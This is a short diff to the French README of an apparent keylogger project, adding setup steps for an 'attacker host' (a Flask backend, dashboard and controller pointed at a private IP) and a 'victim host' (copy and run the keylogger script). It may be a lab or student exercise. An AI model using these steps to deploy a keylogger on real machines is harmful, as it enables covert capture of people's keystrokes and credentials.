@@ -26,8 +26,32 @@ keylogger_project/
 
 C. Installatin & configuration 
 
+- Sur l'hôte de l'attaquant :
+
+```
+# 1. Installer les dépendances
+pip3 install flask requests
+
+# 2. Lancer l'API Backend (port 5000)
+python3 web.py
+
+# 3. Lancer le Dashboard Web (port 8000)
+python3 dashboard.py
+
+# 4. (Optionnel) Lancer le Contrôleur
+python3 controller.py --server http://192.168.30.129:5000
+
+```
 - Sur l'hôte victime
 
+```
+# 1. Copier le fichier keylogger
+# v3_keylogger_simple.py
+
+# 2. Lancer le keylogger
+python3 v3_keylogger_simple.py
+
+```
 
 ```
 CLIENT (Keylogger)
